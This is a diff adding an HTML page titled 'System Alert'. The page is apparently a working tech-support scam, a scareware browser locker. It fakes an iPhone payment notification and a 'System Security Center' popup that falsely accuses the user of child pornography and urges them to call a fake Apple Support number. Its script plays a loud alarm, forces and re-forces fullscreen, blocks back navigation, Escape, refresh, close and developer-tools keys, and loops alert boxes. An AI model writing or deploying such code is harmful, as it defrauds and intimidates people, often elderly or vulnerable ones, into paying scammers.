@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>System Alert</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  overflow: hidden;
+  height: 100vh;
+
+  background-image: url("./Screenshot\ 2026-07-15\ 191808.png");
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+
+  user-select: none;
+}
+
+    #freeze-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.35);
+      z-index: 9998;
+      cursor: not-allowed;
+    }
+    #top-alert {
+      position: fixed;
+      top: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: min(380px, calc(100vw - 24px));
+      z-index: 10001;
+      border-radius: 22px;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.18);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+    }
+
+    #top-alert .notif-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px 6px;
+      background: rgba(245, 245, 247, 0.9);
+    }
+
+    #top-alert .notif-app {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    #top-alert .notif-icon {
+      width: 20px;
+      height: 20px;
+      border-radius: 5px;
+      flex-shrink: 0;
+    }
+
+    #top-alert .notif-app-name {
+      font-size: 11px;
+      font-weight: 500;
+      color: #8e8e93;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    #top-alert .notif-time {
+      font-size: 11px;
+      color: #8e8e93;
+    }
+
+    #top-alert .notif-body {
+      padding: 4px 14px 12px;
+      background: rgba(255, 255, 255, 0.85);
+    }
+
+    #top-alert .notif-sender {
+      font-size: 15px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 2px;
+    }
+
+    #top-alert .notif-message {
+      font-size: 15px;
+      color: #000;
+      line-height: 1.35;
+    }
+
+    #center-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 10000;
+      background: #ffffff;
+      border-radius: 8px;
+      width: min(420px, 90vw);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+      animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    #center-popup .popup-header {
+      background: #ffffff;
+      color: #333;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #eee;
+    }
+
+    #center-popup .popup-body {
+      padding: 24px 20px;
+      text-align: center;
+      background: #ffffff;
+    }
+
+    #center-popup .popup-body .warning-big {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
+
+    #center-popup .popup-body h3 {
+      font-size: 18px;
+      color: #c0392b;
+      margin-bottom: 10px;
+    }
+
+    #center-popup .popup-body p {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    #center-popup .popup-footer {
+      padding: 12px 16px;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      border-top: 1px solid #eee;
+    }
+
+    #center-popup button {
+      padding: 8px 28px;
+      border: none;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    #center-popup .btn-call {
+      background: #007aff;
+      color: #fff;
+    }
+
+    #center-popup .btn-cancel {
+      background: #8e8e93;
+      color: #fff;
+    }
+
+    @keyframes popIn {
+      from { opacity: 0; transform: translate(-50%, -50%) scale(0.6); }
+      to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+    }
+
+    html.pf-forced-fullscreen,
+    html.pf-forced-fullscreen body {
+      position: fixed !important;
+      inset: 0 !important;
+      width: 100vw !important;
+      height: 100vh !important;
+      max-width: 100vw !important;
+      max-height: 100vh !important;
+      overflow: hidden !important;
+      margin: 0 !important;
+      padding: 0 !important;
+    }
+  </style>
+</head>
+<body>
+  <!-- dummy page h ye -->
+
+  <div style="padding: 40px; color: #eee;">
+    <h1></h1>
+  
+  </div>
+
+  <script>
+    (function () {
+      "use strict";
+      const CONFIG = {
+        topAppName: "MESSAGES",
+        topSender: "Payment Successful",
+        topMessage: "Sent $569.90 via Apple Pay to Pornhub Premium. Not you? Call +1-833-316-1716 ",
+        centerTitle: "Warning",
+        centerMessage: "Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support +1-833-316-1716 to unlock it!",
+        emergencyNumber: "+1-833-316-1716", 
+        alertIntervalMs: 4000,
+      };
+
+      let audioCtx = null;
+      let alarmOscillator = null;
+      let alertTimer = null;
+      let frozen = false;
+
+      function createPopups() {
+        const overlay = document.createElement("div");
+        overlay.id = "freeze-overlay";
+
+        const MESSAGES_ICON = `<svg class="notif-icon" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect width="20" height="20" rx="5" fill="#34C759"/><path d="M5 5.5C5 4.67 5.67 4 6.5 4h7c.83 0 1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5H9l-3.5 2.5V5.5z" fill="#fff"/></svg>`;
+
+        const topAlert = document.createElement("div");
+        topAlert.id = "top-alert";
+        topAlert.innerHTML = `
+          <div class="notif-header">
+            <div class="notif-app">
+              ${MESSAGES_ICON}
+              <span class="notif-app-name">${CONFIG.topAppName}</span>
+            </div>
+            <span class="notif-time">now</span>
+          </div>
+          <div class="notif-body">
+            <div class="notif-sender">${CONFIG.topSender}</div>
+            <div class="notif-message">${CONFIG.topMessage}</div>
+          </div>
+        `;
+
+        const centerPopup = document.createElement("div");
+        centerPopup.id = "center-popup";
+        centerPopup.innerHTML = `
+          <div class="popup-header">
+            <span>🛡️</span> System Security Center
+          </div>
+          <div class="popup-body">
+            <div class="warning-big">⚠️</div>
+            <h3>${CONFIG.centerTitle}</h3>
+            <p>${CONFIG.centerMessage}</p>
+          </div>
+          <div class="popup-footer">
+            <button class="btn-call" id="call-btn">Call</button>
+            <button class="btn-cancel" id="cancel-btn">Cancel</button>
+          </div>
+        `;
+
+        document.body.appendChild(overlay);
+        document.body.appendChild(centerPopup);
+        document.body.appendChild(topAlert);
+
+        document.getElementById("call-btn").addEventListener("click", function () {
+          if (CONFIG.emergencyNumber) {
+            window.location.href = "tel:" + CONFIG.emergencyNumber;
+          }
+        });
+
+        document.getElementById("cancel-btn").addEventListener("click", function () {
+          window.alert("⚠ Cannot cancel. A security scan is in progress.");
+        });
+      }
+
+      async function startContinuousAlarm() {
+  try {
+    if (!audioCtx) {
+      audioCtx = new (
+        window.AudioContext ||
+        window.webkitAudioContext
+      )();
+    }
+
+    // Important: resume suspended AudioContext
+    if (audioCtx.state === "suspended") {
+      await audioCtx.resume();
+    }
+
+    const gain = audioCtx.createGain();
+    alarmOscillator = audioCtx.createOscillator();
+
+    alarmOscillator.connect(gain);
+    gain.connect(audioCtx.destination);
+
+    alarmOscillator.frequency.value = 880;
+    alarmOscillator.type = "square";
+
+    // Volume
+    gain.gain.setValueAtTime(
+      0.25,
+      audioCtx.currentTime
+    );
+
+    alarmOscillator.start();
+
+    console.log("Audio state:", audioCtx.state);
+
+  } catch (error) {
+    console.error("Audio failed:", error);
+  }
+}
+async function handleFirstClick() {
+  try {
+    // Start/resume audio while the user gesture is active
+    await startContinuousAlarm();
+
+    // Then request fullscreen
+    if (!document.fullscreenElement) {
+      await document.documentElement.requestFullscreen();
+    }
+
+    // Then show the visual demo
+    createPopups();
+
+    // Browser alerts come last
+    setTimeout(function () {
+      startBrowserAlerts();
+    }, 500);
+
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+document.addEventListener(
+  "click",
+  handleFirstClick,
+  { once: true }
+);
+
+      function startBrowserAlerts() {
+        function showAlert() {
+          window.alert("⚠ SECURITY ALERT\n\nUnauthorized access detected!\nDo NOT close this browser window.");
+        }
+        showAlert();
+        alertTimer = setInterval(showAlert, CONFIG.alertIntervalMs);
+      }
+
+      function blockBackNavigation() {
+        history.pushState(null, "", location.href);
+        history.pushState(null, "", location.href);
+        history.pushState(null, "", location.href);
+
+        window.addEventListener("popstate", function () {
+          history.pushState(null, "", location.href);
+          window.alert("⚠ You cannot go back. A security scan is running.");
+        });
+      }
+
+      function isFullscreen() {
+        return !!(
+          document.fullscreenElement ||
+          document.webkitFullscreenElement ||
+          document.msFullscreenElement ||
+          document.mozFullScreenElement
+        );
+      }
+
+      function enterFullscreen() {
+        document.documentElement.classList.add("pf-forced-fullscreen");
+        if (isFullscreen()) return;
+
+        const el = document.documentElement;
+        const request =
+          el.requestFullscreen ||
+          el.webkitRequestFullscreen ||
+          el.msRequestFullscreen ||
+          el.mozRequestFullScreen;
+        if (request) {
+          request.call(el).catch(function () {});
+        }
+      }
+
+      function enforceFullscreen() {
+        document.documentElement.classList.add("pf-forced-fullscreen");
+        if (!isFullscreen()) {
+          enterFullscreen();
+        }
+      }
+
+      function lockFullscreen() {
+        enforceFullscreen();
+
+        document.addEventListener("fullscreenchange", enforceFullscreen);
+        document.addEventListener("webkitfullscreenchange", enforceFullscreen);
+        document.addEventListener("mozfullscreenchange", enforceFullscreen);
+        document.addEventListener("MSFullscreenChange", enforceFullscreen);
+
+        setInterval(enforceFullscreen, 0);
+
+        document.addEventListener("visibilitychange", function () {
+          if (!document.hidden) enforceFullscreen();
+        });
+
+        window.addEventListener("focus", enforceFullscreen);
+        window.addEventListener("blur", function () {
+          enforceFullscreen();
+          setTimeout(enforceFullscreen, 10);
+          setTimeout(enforceFullscreen, 50);
+          setTimeout(function () { window.focus(); }, 100);
+        });
+
+        ["click", "pointerdown", "mousedown", "touchstart", "keydown"].forEach(function (evt) {
+          document.addEventListener(evt, enforceFullscreen, true);
+        });
+      }
+
+      function freezePage() {
+        document.body.style.overflow = "hidden";
+
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape") {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            enforceFullscreen();
+            return false;
+          }
+          if (
+            e.key === "F5" ||
+            e.key === "F12" ||
+            (e.ctrlKey && (e.key === "w" || e.key === "W" || e.key === "r" || e.key === "R")) ||
+            (e.altKey && e.key === "ArrowLeft") ||
+            (e.key === "Backspace" && e.target === document.body)
+          ) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.alert("⚠ Action blocked. Security scan in progress.");
+            return false;
+          }
+        }, true);
+
+        document.addEventListener("contextmenu", function (e) {
+          e.preventDefault();
+          return false;
+        });
+
+        window.addEventListener("beforeunload", function (e) {
+          e.preventDefault();
+          e.returnValue = "A security scan is in progress. Are you sure you want to leave?";
+          return e.returnValue;
+        });
+
+        window.addEventListener("blur", function () {
+          setTimeout(function () { window.focus(); }, 100);
+        });
+      }
+
+      function init() {
+        if (frozen) return;
+        frozen = true;
+
+        createPopups();
+        freezePage();
+        blockBackNavigation();
+        lockFullscreen();
+        startContinuousAlarm();
+        startBrowserAlerts();
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", init);
+      } else {
+        init();
+      }
+    })();
+  </script>
+</body>
+</html>
